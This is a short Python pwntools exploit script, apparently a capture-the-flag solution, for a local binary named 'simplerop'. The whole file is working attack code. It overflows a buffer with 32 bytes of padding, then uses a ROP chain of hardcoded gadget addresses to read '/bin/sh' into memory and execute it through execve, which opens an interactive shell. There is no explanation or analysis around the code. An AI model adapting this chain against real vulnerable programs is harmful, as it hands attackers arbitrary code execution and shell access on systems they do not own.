from pwn import *

s = process("./simplerop")

elf = ELF("./simplerop")

pop_eax = 0x080e1acd
pop_ebp = 0x08048acd
pop_ebx = 0x0808c149
pop_edi = 0x08066f49
pop_esi = 0x08070c74
pop_ecx_ebx = 0x0806e851
pop_edx = 0x0806e82a
pppr = 0x0809ce91
syscall = 0x0806eef0
read = 0x0806CD50
syscall_ret = 0x0806eef0

s.recvuntil(":")

pay = "A"*32
pay += p32(pop_eax)
pay += p32(3)
pay += p32(pop_ecx_ebx)
pay += p32(elf.bss())
pay += p32(0)
pay += p32(pop_edx)
pay += p32(len("/bin/sh\x00"))
pay += p32(syscall_ret)

pay += p32(pop_eax)
pay += p32(0xb)
pay += p32(pop_ecx_ebx)
pay += p32(0)
pay += p32(elf.bss())
pay += p32(pop_edx)
pay += p32(0)
pay += p32(syscall)

s.send(pay)
s.send("/bin/sh\x00")

s.interactive()

